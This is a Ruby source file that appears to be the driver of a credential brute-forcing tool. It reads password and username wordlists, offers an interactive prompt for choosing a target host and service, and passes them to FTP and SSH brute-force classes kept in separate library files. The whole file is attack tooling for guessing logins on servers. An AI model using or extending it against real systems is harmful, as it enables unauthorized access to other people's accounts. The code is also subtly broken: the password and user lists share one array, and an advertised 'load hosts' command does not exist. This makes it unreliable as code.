$LOAD_PATH << "."
require 'lib/ftpbf.rb'
require 'lib/ssh.rb'


class BruteForcer
  def initialize passwordfile, userfile
    @passwords = @users = []
    fd = File.open(passwordfile, "r")
    fd.each_line {|line| @passwords.push(line.chomp)}
    fd = File.open(userfile, "r")
    fd.each_line {|line| @users.push(line.chomp)}
    @host = []
    @verbosity = 1
    command_center
  end
  def command_center
    print ">> "
    cmd = $stdin.gets.chomp
    load_opts cmd
  end
  def load_opts cmd
    if cmd === "help"
      puts "Options are as follows"
      puts "run           -> begin bruteforcing"
      puts "load hosts    -> set host(s) to attack"
      puts "set service   -> sets service to attack"
      puts "set verbosity -> sets verbosity level of bruteforcer"
      puts "help          -> show this screen"
    elsif cmd === "run"
      bruteforce
    elsif cmd === "set verbosity"
      print "? "
      @verbosity = $stdin.gets.chomp.to_i
      if @verbosity >= 3
        @verbosity = 2
      end
    elsif cmd === "exit"
      return
    elsif cmd === "set service"
      print "supported services are: ftp"
      print "\n"
      print "choose service>> "
      @service = $stdin.gets.chomp
    end
    command_center    
  end
  def bruteforce
    if @host[0] === nil
      print "Specify host to attack: "
      @host[0] = $stdin.gets.chomp
    end
    @host.each do |host|
      if @service === "ftp"
        FTPBrute.new(host, @passwords, @users)
      elsif @service === "ssh"
        SecSH.new(host, @passwords, @users)
      end
    end
  end
end
